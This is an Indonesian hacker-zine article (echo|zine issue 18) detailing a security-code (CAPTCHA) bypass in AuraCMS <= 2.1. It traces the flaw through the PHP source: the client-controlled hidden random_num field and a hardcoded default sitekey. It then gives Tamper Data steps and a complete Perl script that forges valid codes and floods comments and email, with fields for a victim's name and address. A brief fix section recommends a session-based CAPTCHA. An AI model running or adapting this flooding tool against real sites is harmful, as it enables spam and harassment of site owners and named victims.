@@ -1,0 +1,449 @@
+             __                                            
+            /\ \                      __                   
+   __    ___\ \ \___     ___   ____  /\_\    ___      __   
+ /'__`\ /'___\ \  _ `\  / __`\/\_ ,`\\/\ \ /' _ `\  /'__`\ 
+/\  __//\ \__/\ \ \ \ \/\ \L\ \/_/  /_\ \ \/\ \/\ \/\  __/ 
+\ \____\ \____\\ \_\ \_\ \____/ /\____\\ \_\ \_\ \_\ \____\
+ \/____/\/____/ \/_/\/_/\/___/  \/____/ \/_/\/_/\/_/\/____/
+                                                           
+                                                           
+                    
+[ echo|zine, volume 6 issue 18 ]            
+                                 
+ 	AuraCMS <= 2.1 Security Code Exploitation details
+ Brought To You By : Indonesian Newhack Technology, OpenSource & Security
+                     NTOS-Team -> [fl3xu5,k1tk4t,opt1lc]
+                     http://newhack.org
+
+[ Pendahuluan ]
+
+	AuraCMS adalah hasil karya anak bangsa yang merupakan software CMS 
+(Content Managemen System) untuk website yang berbasis PHP4 & MySQL 
+berlisensi GPL (General Public License).
+
+Dengan bentuk yang sederhana dan mudah ini diharapkan dapat digunakan oleh 
+pemakai yang masih pemula sekalipun.
+
+Dan tak lupa bahwa software ini mungkin tak semuanya memenuhi harapan pemakai, 
+oleh karena itu diharapkan adanya kritikan, sumbangan pikiran atau mungkin bentuk 
+modifikasi dari para pengguna sekalian baik berupa modul maupun perubahan-perubahan 
+lainnya yang dapat menjadikan auraCMS ini menjadi lebih baik.
+
+Dalam suatu web app seperti CMS yang telah banyak beredar di internet , dan 
+dalam hal ini web app AuraCMS <= 2.1 perhatian terhadap sekuriti kode merupakan 
+hal yang sangat penting . sehingga bisa dijadikan sebagai salah satu upaya kita 
+untuk lebih mawas terhadap serangan / exploitasi terhadap web app tersebut.
+
+[ Proses_Kerja ]
+
+	AuraCMS <= 2.1 Security Code (ada apa denganmu... - peterpan)
+kami mencoba untuk mengajak teman2 untuk melihat sedikit kedalam kode php 
+mengenai sekuriti kode pada web app AuraCMS <= 2.1
+ 
+kami mengambil satu contoh kode sumber pada berkas "news.php" direktori "/content" ;
+
+---------------- news.php -----------------------------------------------------
+ 184.  $code = substr(hexdec(md5("".date("F j")."".$_POST['random_num']."".$sitekey."")), 2, 6);
+ 185.   if (extension_loaded("gd") AND $code != $_POST['gfx_check']) $error .= "Error: Security Code Invalid<br />";
+ --//--
+ 228. if (extension_loaded("gd")) {
+ 229.    $random_num = gen_pass(10);
+ 230. 	$tengah .= "
+ 231.  	<tr>
+ 232.    <td valign=\"top\">Security Code</td>
+ 233.  	<td valign=\"top\">:</td>
+ 234.    <td valign=\"top\"><img src=\"?code=gfx&random_num=$random_num\" border=\"1\" alt=\"Security Code\"></td>
+ 235.  	</tr>
+ 236.  	<tr>
+ 237.    <td valign=\"top\">Type Code</td>
+ 238.    <td valign=\"top\">:</td>
+ 239.    <td valign=\"top\"><input type=\"text\" name=\"gfx_check\" size=\"10\" maxlength=\"6\"><input type=\"hidden\" name=\"$random_num\"></td>
+ 240.	</tr>";
+ 241.
+ 242. }
+---------------- news.php -----------------------------------------------------
+
+mari kita coba telanjangi kode dan variabel yang menarik diatas, 
+kami berpikir tiga variabel ("random_num","sitekey","gfx_code") 
+bisa dijadikan pambahasan awal dalam kasus kita kali ini,
+
+=> $_POST['random_num']  
+nilai "random_num" yang akan di "$_POST" (kirim) dihasilkan dari fungsi "gen_pass(10)" 
+pada berkas "news.php" baris ke 229, fungsi "gen_pass(10)" ini dibuat dalam 
+berkas "/includes/fungsi.php"
+
+---------------- fungsi.php ---------------------------------------------------
+ 117. function gen_pass($m) {
+ 118.    $m = intval($m);
+ 119.    $pass = "";
+ 120.    for ($i = 0; $i < $m; $i++) {
+ 121.        $te = mt_rand(48, 122);
+ 122.        if (($te > 57 && $te < 65) || ($te > 90 && $te < 97)) $te = $te - 9;
+ 123.        $pass .= chr($te);
+ 124.    }
+ 125.    return $pass;
+ 126. }
+---------------- fungsi.php ---------------------------------------------------
+
+fungsi tersebut menghasilkan kode acak yang hasilnya 
+digunakan sebagai pendefinisian dari variabel "random_num"
+(lihat kembali pada berkas news.php baris 229. " $random_num = gen_pass(10) ")
+
+=> $sitekey 
+variabel "sitekey" sudah terdefinisi pada berkas /include/config.php baris 46.
+
+--------------- config.php ---------------------------------------------------
+ 46. $sitekey = 'x1a1MhphAur4kea7V3Rs820dweOwxIw4n3UgSusyM4nt04';
+---------------- config.php ---------------------------------------------------
+
+=> $_POST['gfx_check']
+nilai dari "gfx_check" adalah nilai masukan yang di "$_POST" (kirim) oleh user 
+dan tentunya nilai tersebut harus sesuai dengan kode gambar yang dihasilkan
+
+seperti kita lihat bersama disini ada 2 register variabel "$_POST" ;
+ 
+ 1. "random_num" 
+ 2. "gfx_check" 
+
+Kenyataan yang terjadi saat kita mengirim komentar pada web app AuraCMS user hanya
+mengirim satu nilai(kasus sekuriti kode) yaitu nilai sekuriti kode yang diwakili oleh "gfx_check", 
+lantas kemana saja lari nya "random_num" (cari tahu dengan akal mu - yellowpages jigle)
+
+baik mari kita lihat bersama dari kode sumber kita, berkas "news.php" pada baris 234. terlebih dahulu
+
+---------------- news.php ---------------------------------------------------
+ 234.    <td valign=\"top\"><img src=\"?code=gfx&random_num=$random_num\" border=\"1\" alt=\"Security Code\"></td>
+---------------- news.php ---------------------------------------------------
+
+"random_num" disini ikut serta menyumbangkan nilai untuk menghasilkan sekuriti kode
+gambar sekuriti kode dihasilkan melalui kode tersebut, "img src" (sumber gambar) "=" (sama dengan) 
+"?code=gfx" (variabel "code" sama dengan "gfx")  "&random_num=$random_num" (dan "random_num" sama dengan nilai acak)
+
+mmm.... kata lain.... http://site.korban/index.php?code=gxf&random_num=[nilai acak] 
+
+jadi maksudnya berkas "index.php" ini sebagai penghasil gambar kode sekuriti,(no..no..no..tunggu dulu - SHE). 
+karena kami sudah mencoba mencari variabel dari "code" dan "random_num" pada "index.php" 
+dan hasilnya nihil, kemudian kami mecoba menelusuri ke ikutsertaan (include) berkas 
+lain dalam  berkas "index.php" ;
+
+---------------- index.php ---------------------------------------------------
+ 12. include "includes/config.php";
+---------------- index.php ---------------------------------------------------
+
+ke ikutsertaan pertama yaitu berkas "config.php" pada direktori "/includes", 
+kami mencoba lagi mencari variabel "code" dan "random_num" disini dan hasilnya tetap nihil, 
+kembali mencari kemungkinan terdapat ke ikutsertaan berkas lain dalam berkas "config.php" ;
+
+---------------- config.php ---------------------------------------------------
+ 74. if (file_exists('includes/fungsi.php')){
+ 75.        include 'includes/fungsi.php';
+ 76. }
+---------------- config.php ---------------------------------------------------
+
+ternyata disini kami melihat 
+"if" (jika) "file_exists" (tersedia berkas) "includes/fungsi.php" (fungsi.php pada direktori includes) 
+	"include" (ikutsertakan) "includes/fungsi.php" (berkas fungsi.php pada direktori includes)
+mm... karena kami melihat berkas "fungsi.php" pada direktori includes itu ada, 
+kami mencoba untuk melihat berkas tersebut dan...(akhirnya ku menemukan mu - naff) 
+iya akhirnya kami menemukan variabel "code" dan "random_num" ;
+
+---------------- fungsi.php ---------------------------------------------------
+ 128.	switch(isset($_REQUEST['code'])) {
+ 129.    case "gfx":
+ 130.    $code = substr(hexdec(md5("".date("F j")."".$_REQUEST["random_num"]."".$sitekey."")), 2, 6);
+ 131.        $image = ImageCreateFromJpeg("images/code_bg.jpg");
+ 132.        $text_color = ImageColorAllocate($image, 100, 100, 100);
+ 133.        Header("Content-type: image/jpeg");
+ 134.        ImageString($image, 5, 12, 2, $code, $text_color);
+ 135.        ImageJpeg($image, "", 50);
+ 136.        ImageDestroy($image);
+ 137.        exit;
+ 138.        break;
+ 139. 	}
+---------------- fungsi.php ---------------------------------------------------
+
+disinilah penghasil gambar kode sekuriti, $_REQUEST['code'] sebagai switch (pengalih) 
+ke kode didalamnya dalam hal ini "code=gfx" dan  $_REQUEST["random_num"] sebagai 
+masukan nilai acak agar gambar kode sekuriti juga acak....
+
+kita sudah melihat bersama variabel "code" dan "random_num" menjelajahi berkas ini, 
+kemudian kembali pada sumber kode kita, berkas "news.php" kali ini pada baris ke 239. ;
+
+---------------- news.php ---------------------------------------------------
+ 239.    <td valign=\"top\"><input type=\"text\" name=\"gfx_check\" size=\"10\" maxlength=\"6\"><input type=\"hidden\" name=\"$random_num\"></td>
+---------------- news.php ---------------------------------------------------
+
+(O..ow kamu ketahuan - mata) Sembunyi, iya "random_num" kali ini "input type=\"hidden\" (sembunyi) 
+mmm... sekarang kami timbul pertanyaan besar, knapa "random_num" harus sembunyi, 
+apa yang disembunyikan dari "random_num"
+
+Dari hasil jalan2 kita dari berkas "news.php" , "index.php" , "config.php" , "fungsi.php" 
+kita bisa lihat kemana saja larinya "random_num" pada berkas "fungsi.php" 
+ternyata "random_num" punya andil dalam menghasilkan gambar sekuriti kode, 
+dan yang lebih buruknya lagi selama ini saat user "$_POST" (mengirim)
+ sekuriti kode melalui "gfx_check" di saat itu juga "random_num" mengirim kode 
+acak secara type=\"hidden"\ (sembunyi)..... ahhh (sungguh tega dirimu - Meggy Z) 
+ 
+kita sudah tahu pada berkas news.php baris 234. "random_num" mengirim kode acak 
+untuk menghasilkan gambar sekuriti kode yang di proses pada berkas "fungsi.php"
+dan kita juga tahu "random_num" mengirim kode acak secara sembunyi saat bersamaan dengan "gfx_check",
+lantas kemana "random_num" mengirim kode acaknya pada berkas "news.php" baris 239. ini ?
+
+Berkas "news.php" pada direktori "/content"
+
+---------------- news.php ---------------------------------------------------
+ 184.  $code = substr(hexdec(md5("".date("F j")."".$_POST['random_num']."".$sitekey."")), 2, 6);
+ 185.   if (extension_loaded("gd") AND $code != $_POST['gfx_check']) $error .= "Error: Security Code Invalid<br />";
+---------------- news.php ---------------------------------------------------
+
+iya... "random_num" mengirimnya kesini".$_POST['random_num']."... perhatikan 
+dan cermati kode tersebut, kode tersebut digunakan sebagai sekuriti kode CEK! , 
+dan pecahkan saja berkas "fungsi.php", dengan Begitu, "KITA TIDAK BUTUH BERKAS "fungsi.php" 
+YANG HANYA DIGUNAKAN UNTUK MENGHASILKAN GAMBAR SEKURITI KODE"
+dan kita juga tidak butuh fungsi "gen_pass(10)" untuk menghasilkan kode acak, 
+karena kita sudah tahu bahwa "random_num" mengirim kode acaknya secara sembunyi 
+pada saat bersamaan dengan "gfx_check" dan kita bisa memanipulasinya 
+karena "User are Evil" - y3dips [at] http://e-rdc.org/v1/news.php?readmore=43
+
+User hanya cukup bermain pada berkas "news.php" karena sebenarnya baris 184 - 185, 
+sebagai proses pengecekan sekuriti kode, berkas "fungsi.php" hanyalah digunakan sebagai
+penghasil nilai acak "gen_pass(10)" dan penghasil gambar sekuriti kode, 
+
+Dengan mencermati baris 184 - 185 pada berkas "news.php", user bisa memanipulasi 
+nilai masukan dari "random_num" dan "gfx_check", dengan  mendefinisikan terlebih 
+dahulu nilai dari "random_num"
+
+[ Proof Of Concept ]
+
+	untuk pembuktian bahwa user bisa memanipulasi dan membypass sekuriti kode 
+dari web app AuraCMS <= 2.1
+
+1. kita definisikan terlebih dahulu "random_num"
+karena user sudah tidak butuh "gen_pass(10)" untuk mendapatkan kode acak, 
+karena sekarang USER YANG BERKUASA
+
+	random_num = 666
+
+untuk mendapatkan nilai "gfx_check" user dengan mudah mendapatkannya dengan melalui
+	
+	http://site.korban/?code=gxf&random_num=666
+
+catat kode yang dihasilkan dari gambar sekuriti kode dan itu sebagai "gfx_check"
+
+	gfx_check = 879031
+
+2. Gunakan Firefox dan install plugin tamper data
+
+	https://addons.mozilla.org/en-US/firefox/addon/966
+
+plugin ini sebagai media  untuk memanipulasi "random_num" dan "gfx_check" hasil manipulasi USER
+
+setelah semuanya siap...
+hidupkan firefox tamper data pada Tools->Tamper Data->Start Tamper 
+Posting komentar, masukan semua isian kecuali "Type Code"  dan Submit
+Tamper -> saatnya manipulasi nilai "random_num" dan "gfx_check" sesuai dengan 
+nilai yang sudah di tentukan di awal Dan Selanjut nya Terserah Anda ...
+
+nilai dari "gfx_check" hanya berlaku satu hari karena terdapat kode ".date("F j")." dalam prosesnya
+(lihat kembali baris 184. pada berkas "news.php" )
+
+Kami juga menulis sebuah tools untuk pembuktian masalah sekuriti kode ini kedalam kode perl
+dan akibat yang bisa terjadi karena kesalahan sekuriti kode ini
+
+#-------------------------[ Mulai ]----------------------------
+| #!/usr/bin/perl
+|
+| use Digest::MD5 qw(md5_hex);
+| use LWP::UserAgent;
+| use Getopt::Long;
+| no warnings;
+| 
+| if(!$ARGV[5])
+| {
+| print "\n  |--------------------------------------------------------|";
+| print "\n  |             Indonesian Newhack Technology              |";
+| print "\n  |--------------------------------------------------------|";
+| print "\n  | AuraCMS - Sekuriti Kode ByPass - Komentar/Email Flood  |";
+| print "\n  |                 Coded by NTOS-Team                     |";
+| print "\n  |--------------------------------------------------------|";
+| print "\n  | ";
+| print "\n[!] Penggunaan : ";
+| print "\n[>] perl auracmsflood21.pl [Site] [Path] [id berita] [jumlah flood] [option] ";
+| print "\n ";
+| print "\n[!] [option]   : ";
+| print "\n[>] 1 = komentar flooding | 2 = email flooding";
+| print "\n ";
+| print "\n[!] Contoh     : ";
+| print "\n[>] perl auracmsflood21.pl korban.site /auracms2.1/ 10 100 -o 2";
+| print "\n ";
+| print "\n";
+| exit;
+| }
+| $host		= $ARGV[0];| $path		= $ARGV[1];
+| $id			= $ARGV[2];
+| $xflod		= $ARGV[3];
+| $namakorban	= "amalan"; #ganti dengan nama korban
+| $emailkorban= "korban%40yahoo.com"; # %40 = @ | ganti dengan email korban
+| @namabulan 	= qw(January February March April May June July August September October November December);
+| $sitekey 	= "x1a1MhphAur4kea7V3Rs820dweOwxIw4n3UgSusyM4nt04"; #defaul kode dari config.php
+| $tgl 		= (localtime)[3];
+| $bln 		= (localtime)[4];
+| $bulan 		= $namabulan[$bln];
+| $date 		= "$bulan $tgl";
+| %options = ();
+| GetOptions(\%options, "o=i",);
+|
+| $browser	= LWP::UserAgent->new() or die();
+| $getgfx = $browser -> get("http://".$host.$path."?pilih=news&aksi=lihat&id=".$id,);
+| $get = $getgfx -> content;
+| 	if ($get =~ /random_num" value="(.*?)"><\/td>/) 
+|	{ 
+|	$randnum = $1; 
+|	}
+| $gfx = substr(hex(md5_hex($date.$randnum.$sitekey)), 2, 6);
+| 	if($options{"o"} && $options{"o"} == 1) 
+|	{ 
+|	komenflood(); 
+|	}
+|	if($options{"o"} && $options{"o"} == 2) 
+|	{ 
+|	posting(); 
+|	} 
+|	
+| sub komenflood()
+| {
+| for(my $i = 1; $i <= $xflod; $i++){
+| $browser	= LWP::UserAgent->new() or die();
+| $postingkomen = $browser -> post(
+| "http://".$host.$path."?pilih=news&aksi=lihat&id=".$id,
+|	[
+|	  "nama"=>$namakorban,
+|	  "email"=>$emailkorban,
+|	  "judul"=>"terimakasih",
+|	  "konten"=>"terimakasih",
+|	  "gfx_check"=>$gfx,
+|	  "random_num"=>$randnum,
+|	  "artikel"=>$id,
+|	  "submit"=>"Submit",
+|	],
+| );
+| $komen = $postingkomen -> content;
+|	if ($komen =~ /<p>Komentar telah dikirim<br/) 	
+|	{
+|	print "[!]Posting Komentar\n";
+|	} 
+|	else 
+|	{
+|	print "\n [!]Gagal Kirim Komentar\n"; exit();
+|	}
+|	if ($komen =~ />Error: Security Code Invalid</)	
+|	{
+|	print "\n [!]Sekuriti Kode Salah\n"; exit();
+|	}
+|  }
+|  }
+|
+| sub posting()
+| {
+| $browser	= LWP::UserAgent->new() or die();
+| $postingkomen = $browser -> post(
+| "http://".$host.$path."?pilih=news&aksi=lihat&id=".$id,
+|	[
+|	  "nama"=>$namakorban,
+|	  "email"=>$emailkorban,
+|	  "judul"=>"terimakasih",
+|	  "konten"=>"terimakasih",
+|	  "gfx_check"=>$gfx,
+|	  "random_num"=>$randnum,
+|	  "artikel"=>$id,
+|	  "submit"=>"Submit",
+|	],
+| );
+| $komen = $postingkomen -> content;
+|	if ($komen =~ /<p>Komentar telah dikirim<br/) 
+|	{ 
+|	print "\n [+]Komentar berhasil dikirim\n"; cekposting(); 
+|	} 
+|	else 
+|	{
+|	print "\n [!]Gagal Posting Komentar\n"; exit();
+|	}| }
+|
+| sub cekposting()
+| {
+| $cekpost = $browser -> get("http://".$host.$path."?pilih=news&aksi=lihat&id=".$id,);
+| $cek = $cekpost -> content;
+| 	if ($cek =~ /<span><a href=".\/(.*?)">$namakorban<\/a>/) 
+|	{ 
+|	$href = $href.$1; 
+|	}
+|	if ($cek =~ />$namakorban<\/a>/) 
+|	{ 
+|	emailflood(); 
+|	} 
+|	else 
+|	{
+|	print "\n [!]Tidak Ada Komentar\n"; exit();
+|	}
+| }
+|
+| sub emailflood()
+| {
+| for(my $i = 1; $i <= $xflod; $i++){
+| $result = $browser -> post(
+| "http://".$host.$path.$href,
+|	[
+|	  "nama"=>"t4mugel4p",
+|	  "email"=>"t4mu%40gel4p.com",
+|	  "subyek"=>"Test Flood",
+|	  "pesan"=>"Test Flood",
+|	  "gfx_check"=>$gfx,
+|	  "random_num"=>$randnum,
+|	  "op"=>"komentar",
+|	  "submit"=>"Submit",
+|	],
+| );
+| print "[+]Kirim Email\n";
+| }
+| }
+#------------------------------[ Selesai - Potong Disini ]--------------------------------
+
+[ Fix ]
+
+	Ganti Sekuriti Kode Bawaan dengan menggunakan Captcha yang berdasarkan session
+
+[ Penutup ]
+
+	Masalah Sekuriti Kode ini tidak hanya terdapat pada Web App AuraCMS <= 2.1 saja
+kami juga banyak menemui site produksi yang tersebar di dunia internet yang juga
+memiliki kesamaan parmasalahan dalam proses sekuriti kode tersebut
+kami berharap tulisan ini dapat membuat kita lebih waspada lagi akan 
+pentingnya sekuriti kode dalam web app tersebut, dan bukan hanya menjadikan
+sekuriti kode ini sebagai pelengkap dan pemanis web site saja
+
+[ Referensi ]
+
+- Aura CMS - http://www.auracms.org/index.php?pilih=hal&id=4
+- Permasalah Sekuriti Kode ditemukan pertama kali oleh "Tidak Dikenal" 
+  yang memgirimkan komentar pada http://newhack.org/index.php?pilih=news&aksi=lihat&id=27 :
+ 
+  "Kami mengucapkan terima kasih banyak kepada "test" disini yang sudah berkenan 
+   memberi peringatan kepada kami akan terjadinya kesalahan dalam sekuriti 
+   kode AurCMS 2.1 yang kami gunakan"
+
+- Hasil Riset Lanjutan NTOS-Team [fl3xu5,k1tk4t,opt1lc], 
+  dari "bagaimana proses kerja Sekuriti Kode web app AuraCMS <= 2.1"
+
+
+[ Terima Kasih ]
+
+- ALLAH SWT dan Nabi Muhammad SAW atas segala karunia NYA.
+- indon[E]sian [C]ommunity for [H]ackers and [O]pen source - www.eCHo.or.id semua staff dan membernya 
+- Indonesian Newhack Technology member
+- Pecinta Dunia IT Indonesia
+- Indonesian Underground Community [chanel, forum,milist dsb].
+
+*- $e18dot005dottxt - echo|zine - issue#18 - 280308 -*
+
+
+
